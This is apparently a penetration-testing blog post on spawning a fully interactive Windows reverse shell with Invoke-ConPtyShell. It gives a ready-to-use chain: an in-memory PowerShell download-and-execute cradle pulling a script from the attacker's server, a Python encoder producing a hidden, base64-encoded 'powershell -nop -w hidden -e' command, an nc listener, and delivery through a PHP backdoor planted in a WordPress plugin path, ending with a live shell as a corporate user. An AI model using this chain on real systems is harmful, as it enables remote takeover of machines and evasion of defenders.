---
layout: post
title: "When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell"
date: 2025-09-09
---

Picture this. You're in a good workflow on a Windows target, you even added line editing and command history with `rlwrap`. Then it happens, you accidentally start a program in the foreground... Instinctively, you press `Ctrl + C` in your `nc` Windows shell, killing your shell access along with the program. Not ideal, and very frustrating.

Enter [Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell), a fully interactive reverse shell for Windows. Gone are the days of accidental shell deaths. All you'll need is an HTTP server, `nc` listener, and a good attitude :)

**Disclaimer:** `Invoke-ConPtyShell.ps1` utilizes the [CreatePseudoConsole](https://learn.microsoft.com/en-us/windows/console/createpseudoconsole) function, which is only available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763). If this function is *not* available on the target, you will receive a normal `nc` shell.

# Staging the Script & Listener

Navigate to the above linked GitHub repository and download the `Invoke-ConPtyShell.ps1` PowerShell script onto your attack machine.

Host the file on your attack machine with `python3 -m http.server 80`.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ ls   
Invoke-ConPtyShell.ps1
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Setup your reverse shell listener on your attack machine with `stty raw -echo; (stty size; cat) | nc -lvnp <ATTACK-PORT>`, where `<ATTACK-PORT>` is your listener port of choice.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 443
listening on [any] 443 ...
```
# Breaking Down the Command

You may have noticed that my PowerShell download command is slightly different from the `README.md` example, but both achieve the same end goal of downloading and executing the PowerShell script *without* saving it to disk.

```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<ATTACK-IP>/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell <ATTACK-IP> <ATTACK-PORT> -Rows <ROWS> -Cols <COLS>
```

- `Invoke-Expression (IEX)`: Evaluate/run a specified string as a command and returns the results of the expression/command. This allows you to save the script directly in memory.
- `New-Object`: Create an instance of a Microsoft .NET Framework or COM object (System.Net.WebClient in this case).
- `.DownloadString()`: Downloads the requested resource (Invoke-ConPtyShell.ps1) as a string.
- `Invoke-ConPtyShell`: Executing the ConPtyShell script now in memory.

# Encoding the Command

Before preceding any further, take note of your attack machine's terminal size with `stty size`. This will output the number of rows and columns, respectively. It is important to configure the terminal size correctly or you may inadvertently cut off valuable output in your shell.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty size                                      
52 236
```

Attempting to use `echo` and piping the output to `base64` on Linux does not result in a properly encoded command. `echo` outputs text in `UTF-8` encoding by default, whereas PowerShell is expecting `UTF-16LE` (little endian). This is where the following Python script comes into play.

```python
#!/usr/bin/python3
import base64
payload = 'IEX(New-Object System.Net.WebClient).DownloadString("http://<ATTACK-IP>/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell <ATTACK-IP> <ATTACK-PORT> -Rows <ROWS> -Cols <COLS>'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print("\033[1;37m[*] Encoded command: \033[1;00m\033[1;33m" + cmd + "\033[00m")
```

- `<ATTACK-IP>`: Attack machine's IP address.
- `<ATTACK-PORT>`: Attack machine's `nc` reverse shell listener port.
- `<ROWS>`: Number of terminal rows.
- `<COLS>`: Number of terminal columns.

Once you've entered all IP, port, and terminal information, execute the Python script using `python3 conpty.py` to output the encoded PowerShell command.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 conpty.py          
[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
```

# Execution

All that is left to do is copy the command and execute it via your target's RCE vulnerability. This example uses a PHP backdoor.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ curl -b "wordpress_d407..." "http://192.168.X.X/foo/bar-content/plugins/askimet/?cmd=powershell%20-nop%20-w%20hidden%20-e%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A..."
```

If you navigate back to the Python HTTP server terminal, you'll notice the target has downloaded the PowerShell script.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.X.X - - [08/Sep/2025 21:49:58] "GET /Invoke-ConPtyShell.ps1 HTTP/1.1" 200 -
```

Navigate to the reverse shell listener terminal and enjoy your fully interactive Windows reverse shell, `Ctrl + C` and all!

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\foo\htdocs\bar> whoami
bar\corpuser
PS C:\foo\htdocs\bar> ^C
PS C:\foo\htdocs\bar> ^C
PS C:\foo\htdocs\bar>
```